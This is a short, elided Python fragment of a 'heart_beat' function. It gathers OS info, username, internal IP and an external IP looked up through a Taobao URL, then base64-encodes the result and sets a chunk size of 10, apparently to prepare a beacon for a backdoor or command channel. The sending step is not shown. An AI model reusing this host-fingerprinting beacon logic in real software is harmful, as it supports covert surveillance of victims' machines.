...
def heart_beat():
	...
	outip = ""
	try:
		req = urllib2.Request("http://www.taobao.com/help/getip.php")
		res_data = urllib2.urlopen(req, timeout=1)
		outip = res_data.read()[16:][0:-3]
	except:
		outip="0"
		
	msg = '%s:%s:%s:%s' % (osinfo, user, ip, outip)
	dmsg = str(base64.b64encode(bytes(msg, 'utf-8')), 'utf-8').rstrip('=')
	split = 10
